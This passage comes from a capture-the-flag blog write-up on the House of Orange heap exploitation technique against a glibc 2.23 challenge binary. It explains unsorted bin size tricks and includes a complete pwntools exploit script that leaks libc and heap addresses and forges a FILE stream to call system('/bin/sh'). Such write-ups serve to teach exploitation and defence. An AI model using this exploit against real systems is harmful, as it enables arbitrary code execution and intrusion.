</span></span><span class=line><span class=cl><span class=n>chunk_C3</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>chunk_A2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_A2</span><span class=p>,</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mh>0x58</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0xc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_B2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_B3</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># string &#34;/bin/sh&#34; to _flag size field</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_B3</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>10</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> \
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_C3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_E</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0x178</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>My configure struct</strong></p><p><img src=https://hackmd.io/_uploads/rk_sIMxH0.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/BJfnIzeS0.png loading=lazy alt=image></p><p><img src=https://hackmd.io/_uploads/H1KnIzeB0.png loading=lazy alt=image></p><p><strong>However, there will be a mistake when I do it. Notice that triggers can happen when sorting this fake chunk, not allocating it (the program will not abort and the location of this will not reside in 0x60 bk small bin)</strong></p><p><img src=https://hackmd.io/_uploads/BkIZ8fgSC.png loading=lazy alt=image></p><ul><li>IO_list_all</li></ul><p><img src=https://hackmd.io/_uploads/BkYm8flHR.png loading=lazy alt=image></p><ul><li>IO_list_all.file._chain</li></ul><p><em><strong>I set up fake file stream successfully; however, I need to trigger to move it into _IO_list_all</strong></em></p><h5 id=trigger-size>Trigger size</h5><p><img src=https://hackmd.io/_uploads/rkC6Pzer0.png loading=lazy alt=image></p><p><em><strong>Method 1</strong></em>
_IO_list_all -> _chain: 0x60 bk small bin -> _chain: 0xb0 small bin</p><p><em><strong>Set size chunk C to 0xb1</strong></em></p><p><em><strong>Method 2</strong></em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>          /* Take now instead of binning if exact fit */
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>          if (size == nb)
</span></span><span class=line><span class=cl>            {
</span></span><span class=line><span class=cl>              set_inuse_bit_at_offset (victim, size);
</span></span><span class=line><span class=cl>              if (av != &amp;main_arena)
</span></span><span class=line><span class=cl>                victim-&gt;size |= NON_MAIN_ARENA;
</span></span><span class=line><span class=cl>              check_malloced_chunk (av, victim, nb);
</span></span><span class=line><span class=cl>              void *p = chunk2mem (victim);
</span></span><span class=line><span class=cl>              alloc_perturb (p, bytes);
</span></span><span class=line><span class=cl>              return p;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>          /* place chunk in bin */
</span></span></code></pre></td></tr></table></div></div><ul><li>The exact fitting chunks are allocated from the unsortedbin, otherwise they&rsquo;re sorted into the appropriate small or large bin. The &rsquo;nb&rsquo; variable represents the normalized request size, it&rsquo;s the result of malloc rounding up your request to the nearest actual chunk size.</li><li>For example, if I request 3 bytes, &rsquo;nb&rsquo; would hold the value 0x20.</li><li>In the case of our challenge binary &rsquo;nb&rsquo; is always 0x60.</li><li>The &lsquo;size&rsquo; variable represents the size of the unsorted chunk currently under inspection. malloc masks off the chunk&rsquo;s flags prior to this comparison to stop them from interfering.</li><li><em><strong>But chunk size fields only hold three flags, the fourth least-significant bit is neither a flag nor does it contribute to a chunk&rsquo;s size. During unsorted bin searches it is not masked off prior to this comparison because there&rsquo;s no good reason for it to ever be set in the first place.</strong></em></li><li>So if we set the fourth least-significant bit of our 0x60 chunk, giving it a size field of 0x68, or 0x69 if you want to keep the prev_inuse flag, <strong>it won&rsquo;t be considered an exact fit during requests for 0x60-sized chunks</strong>. However, i<strong>t will sort this chunk to 0x60 small bin.</strong></li><li>Furthermore, the code responsible for sorting chunks into their respective bins does mask off, specifically it rotates away, the entire low order nybble of their size field, meaning that our chunk with the 0x68 size field will still be correctly sorted into the 0x60 smallbin.</li></ul><p><em><strong>Set size chunk C to 0x68</strong></em></p><h4 id=complete-script-1>Complete script</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./one_byte&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.23/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+244
</span></span></span><span class=line><span class=cl><span class=s2>b *main+311
</span></span></span><span class=line><span class=cl><span class=s2>b *main+415
</span></span></span><span class=line><span class=cl><span class=s2>b *main+480
</span></span></span><span class=line><span class=cl><span class=s2>b *main+560
</span></span></span><span class=line><span class=cl><span class=s2>b *main+652
</span></span></span><span class=line><span class=cl><span class=s2>b *main+713
</span></span></span><span class=line><span class=cl><span class=s2>b *main+788
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>remote</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x58</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>output</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_A</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>chunk_B</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>chunk_C</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>chunk_D</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>chunk_E</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ===================================================================================================</span>
</span></span><span class=line><span class=cl><span class=c1># Leak libc</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>,</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mh>0x58</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0xc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_B</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_B2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>unsortedbin_data</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>chunk_C</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>unsortedbin</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>unsortedbin_data</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>unsortedbin</span> <span class=o>-</span> <span class=mh>0x399b78</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;unsortedbin: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>unsortedbin</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ===================================================================================================</span>
</span></span><span class=line><span class=cl><span class=c1># Leak heap</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_C2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_C2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fastbin_data</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>chunk_C</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>fastbin_data</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>8</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;heap: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ===================================================================================================</span>
</span></span><span class=line><span class=cl><span class=c1># house of oragne</span>
</span></span><span class=line><span class=cl><span class=n>chunk_C3</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>chunk_A2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_A2</span><span class=p>,</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mh>0x58</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0xc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_B2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_B3</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># string &#34;/bin/sh&#34; to _flag size field</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_B3</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>10</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x68</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>#edit(chunk_B3, p64(0)*10 + b&#39;/bin/sh\x00&#39; + p8(0xb1))</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> \
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_list_all&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span>\
</span></span><span class=line><span class=cl><span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_C3</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_E</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap</span> <span class=o>+</span> <span class=mh>0x178</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/pwnable/>Pwnable</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><section class=article-lastmod><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<span>Last updated on Jun 15, 2024 00:00 UTC</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/the-house-of-rabbit/><div class=article-image><img src=/p/the-house-of-rabbit/cover.364131cb46a6f21fe9e9c0f541615683_hu9d8857c717d96ad2f86768a20d874436_10244_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post The House of Rabbit" data-hash="md5-NkExy0am8h/p6cD1QWFWgw=="></div><div class=article-details><h2 class=article-title>The House of Rabbit</h2></div></a></article><article class=has-image><a href=/p/the-house-of-spirit/><div class=article-image><img src=/p/the-house-of-spirit/cover.165ad78521342e7305b88a8986f0e768_hua4516f7622f942ea94cadaa72a82b7db_84930_250x150_fill_q75_box_smart1.jpg width=250 height=150 loading=lazy alt="Featured image of post The House of Spirit" data-hash="md5-FlrXhSE0LnMFuIqJhvDnaA=="></div><div class=article-details><h2 class=article-title>The House of Spirit</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 Blog's Broder</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>